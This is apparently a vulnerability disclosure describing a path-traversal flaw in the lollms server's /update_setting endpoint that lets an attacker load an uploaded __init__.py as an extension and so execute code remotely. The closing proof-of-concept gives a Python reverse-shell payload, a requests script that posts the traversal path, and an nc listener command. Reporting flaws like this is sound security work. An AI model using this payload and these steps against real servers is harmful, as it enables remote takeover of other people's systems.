# Remote Code Execution due to the lack of sanitization of key 'extensions' 

# Description
`app.py` :` LollmsApplication's __init__()-> mount_extensions -> mount_extension` allow the server to `mount specificed extension` via walking through the  `extensions[]` in `personal_data/configs/local_config.yaml`, which can be edited via remote endpoint `/update_setting`. However the `/update_setting` didnot contains any sanitization when `"setting_name": "extensions"` especially when the path contains path traversal payloads. Which cause the server to load `__init__.py` in arbitrary when running `importlib.machinery.SourceFileLoader(module_name, str(absolute_path / "__init__.py"))`. Which the path can be pointing to the `upload directory for each dicussions` , causing the server to load arbitrary python file, thus causing RCE.

 # Proof of Concept

## Path travsal

From `app.py` 's` LollmsApplication's __init__()-> mount_extensions -> mount_extension`

```python
class LollmsApplication(LoLLMsCom):
    def __init__(
                    self, 
                    app_name:str, 
                    config:LOLLMSConfig, 
                    lollms_paths:LollmsPaths, 
                    load_binding=True, 
                    load_model=True, 
                    try_select_binding=False, 
                    try_select_model=False,
                    callback=None,
                    sio:AsyncServer=None,
                    free_mode=False
                ) -> None:
        """
        Creates a LOLLMS Application
        """
        super().__init__(sio)
        self.app_name                   = app_name
        self.config                     = config
        self.lollms_paths               = lollms_paths

 		# Codes.....          
            self.mount_personalities()
            self.mount_extensions()
```
```python
def mount_extensions(self, callback = None):
        self.mounted_extensions = []
        to_remove = []
        for i in range(len(self.config["extensions"])):
            p = self.mount_extension(i, callback = None)
            if p is None:
                to_remove.append(i)
        to_remove.sort(reverse=True)
        for i in to_remove:
            self.unmount_extension(i)
```

```python
def mount_extension(self, id:int, callback=None):
    try:
        extension = ExtensionBuilder().build_extension(self.config["extensions"][id], self.lollms_paths, self)
        # ^^^ Calls ExtensionBuilder ^^^
        self.mounted_extensions.append(extension)
        return extension
    except Exception as ex:
        ASCIIColors.error(f"Couldn't load extension. Please verify your configuration file at {self.lollms_paths.personal_configuration_path} or use the next menu to select a valid personality")
        trace_exception(ex)
    return None
```

Whenever the `app.py` is ran, `app.py` will execute `mount_extension(self, id:int, callback=None)` via a long callchain. Which `id` is pass when traveling the `self.config["extensions"])` in `mount_extensions`

However, as we can see in the `mount_extension`, the server passed the `build_extension 's first arg of the extension` directly via `self.config["extensions"][id]`

This seem a pretty safe code. However, since in `app.py` 's` LollmsApplication's __init__()-> mount_extensions -> mount_extension`, the `extension_path:str` argument is passed as the `self.config["extensions"][id]` Furthermore, the `endpoint` of the `lollms server` allowed us to directly change `configs` via `/update_setting` `endpoint`:

```python
@router.post("/update_setting")
async def update_setting(request: Request):
    """
    Endpoint to apply configuration settings.

    :param request: The HTTP request object.
    :return: A JSON response with the status of the operation.
    """

    try:
        config_data = (await request.json())
        if "config" in config_data.keys():
            config_data = config_data["config"]
        setting_name = config_data["setting_name"]
        setting_value = config_data["setting_value"]

        ASCIIColors.info(f"Requested updating of setting {setting_name} to {setting_value}")
 		# Codes.....
        else:
            if setting_name in lollmsElfServer.config.config.keys():
                lollmsElfServer.config[setting_name] = setting_value
            else:
                if lollmsElfServer.config["debug"]:
                    print(f"Configuration {setting_name} couldn't be set to {setting_value}")
                return {'setting_name': setting_name, "status":False}

        # Codes.....
            
        ASCIIColors.success(f"Configuration {setting_name} updated")
        if lollmsElfServer.config.auto_save:
            lollmsElfServer.config.save_config()
        # Tell that the setting was changed
        return {'setting_name': setting_name, "status":True}
```

The `@router.post("/update_setting")` do not have any special `extensions` `statements` to deal with if  `setting_name == "extensions"` for example the built-in `sanitize_path_from_endpoint(` function, thus we can turn `extensions` to any thing in any length via the `@router.post("/update_setting")` endpoint, including payloads that contains `../../../../` that will cause path traversal vulnerability.

## RCE

Now lets take a look into `class ExtensionBuilder`：

```python
class ExtensionBuilder:
    def build_extension(
                        self, 
                        extension_path:str, 
                        lollms_paths:LollmsPaths,
                        app,
                        installation_option:InstallOption=InstallOption.INSTALL_IF_NECESSARY
                    )->LOLLMSExtension:

        extension, script_path = self.getExtension(extension_path, lollms_paths, app)
        return extension(app = app, installation_option = installation_option)
    
    def getExtension(
                        self, 
                        extension_path:str, 
                        lollms_paths:LollmsPaths,
                        app
                    )->LOLLMSExtension:
        
        extension_path = lollms_paths.extensions_zoo_path / extension_path

        # define the full absolute path to the module
        absolute_path = extension_path.resolve()
        # infer the module name from the file path
        module_name = extension_path.stem
        # use importlib to load the module from the file path
        loader = importlib.machinery.SourceFileLoader(module_name, str(absolute_path / "__init__.py"))
        extension_module = loader.load_module()
        extension:LOLLMSExtension = getattr(extension_module, extension_module.extension_name)
        return extension, absolute_path
```

As we can see, this part of code firstly defines a class named `ExtensionBuilder` for building and loading external extensions. The `build_extension` method takes an extension path, a `LollmsPaths` instance, an application instance, and an installation option (default is to install when necessary), and returns a configured extension instance. The `getExtension` method is responsible for loading and returning an extension class (`LOLLMSExtension`) and script path, given an extension path and application instance. Specifically, it dynamically loads a module using `importlib` by parsing the extension path and retrieves a specified extension class instance from it.

However, as we see here, the server directly concat `lollms_paths.extensions_zoo_path / extension_path` to generate the `extension_path` and loads `extension_path.resolve() / "__init__.py"` directly via `importlib.machinery.SourceFileLoader`. In which `extension_path` is vulnerable to path traversal. 

Thus, if we change `"setting_name": "extensions",` in to a list that contains a path-traversing payload to a location that we can upload `py` files(in this case can be our `upload directory for each dicussions`). The server will consequently loads the `__init__.py` can cause it to execute arbitrary codes `like os.system` and even creating a reverse-shell connection.

# Exploit (Proof of Concept)

1: create a `__init__.py` contains your payload, for instance:

```python
# __init__.py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<YOUR_SERVER>,<YOUR_PORTS>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

2: Upload your `__init__.py` via `discussion -> Send file to AI`

3: Get the absolute location to your `text_data` (or your can use relative path): the Path to `uploads` will pop up on the right side of the chat when you fetching a webpage in discussion, the `uploaded file` will be in the `personal_data/discussion_databases/{current databse name}/{discussion index}/text_data/` (index can be checked by `burpsuite` when visiting a discussion)

4: use `/update_setting` to update ` "setting_name": "extensions"` to an Path Traversal payload pointing the `personal_data/discussion_databases/{current databse name}/{discussion index}/text_data/`

5: Send your payload to `/update_setting`, you can intercept packages when `updating setting` using `burpsuite` or using:

```python
import requests
import json

path = "../../../../../../../../../<path>/<to>/<uploaded>/<file>"
target = "http://localhost:9600"

payload = {
    "setting_name": "extensions",
    "setting_value": [path]
}

requests.post(
        target + "/update_setting", 
        data=json.dumps(payload), 
        headers={"Content-Type": "application/json"}
    )

```

6: Set-up listen server in your server, instance: `nc -lvnp 4444`

7: Whenever the `app.py` is executed (updated, reloaded, or restarted), you will recieve a reverse-shell connection!





